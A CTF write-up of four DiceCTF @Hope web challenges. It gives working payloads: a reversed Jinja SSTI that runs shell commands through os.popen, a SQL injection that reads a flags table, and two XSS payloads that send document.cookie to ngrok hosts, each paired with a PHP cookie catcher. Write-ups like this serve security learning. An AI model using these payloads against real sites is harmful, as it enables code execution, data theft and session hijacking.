# DiceCTF @Hope writeup

Mostly solved the web challenges with Task_Hashed

---------------------------------------------------------------------------------------------------

## Reverser

the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed

regular payload: 
```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

{{config.__class__.__init__.__globals__['os'].popen('cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt').read()}}
```
supplied reversed payload:

```
}}  )(daer.)'sl'(nepop.]'so'[__slabolg__.__tini__.__ssalc__.gifnoc {{
    
}})(daer.)'txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac'(nepop.]'so'[__slabolg__.__tini__.__ssalc__.gifnoc{{
```


---------------------------------------------------------------------------------------------------

## Pastebin 

the important part of this challenge is :

```python 
    if (paste.search(/<.*>/) !== -1) {
        return res.redirect('/flash?message=Illegal characters in paste!');
        }
```

My solution : 

```html
<img src=x onerror=javascript:document.location='http://37b0-41-225-85-6.ngrok.io/ok.php?c='+document.cookie;
```

with ok.php :
```php
<?php 
    $cookies = $_GET["c"];
?>
``` 
---------------------------------------------------------------------------------------------------

## oeps

this challenge requires to put a palindrome string to add them to the pending table

notice there's two ways we can control user input. either search for approved sentences or pass our own but it has to be a palindrome

since the search is blocking special chars we can try with the pending sentences input

so we can try some sql injections

this is what the query looked like 

```python 
connection.execute('''
        insert into pending (user, sentence) values ('%s', '%s');
    ''' % (
        token,
        submission
))
```


payload: ```')--```
payload supplied : ```')---)'```

and we can see we get a blank input meaning our payload worked! and we know the flag is in the flags table so we can use the ```'%'||(query)||'%'``` to get an element from another table

payload : ```%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'% ``` 

the final query looks like this 

```sql
insert into pending (user, sentence) values ('1234', '%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'%');
```

```
flag : hope{ecid_gnivlovni_semordnilap_fo_kniht_ton_dluoc}
```

------------------------------------------------------------------------------------------------------------------------------------

## mk

Abusing MathJax renderer for an xss by supplying the source to the mathjax file

payload :

```javascript
<script src="https://mk.mc.ax/MathJax/MathJax.js">document.location='http://02f6-41-225-148-43.ngrok.io/ok.php?c='+document.cookie;</script>
```


with ok.php :
```php
<?php 
    $cookies = $_GET["c"];
?>
``` 
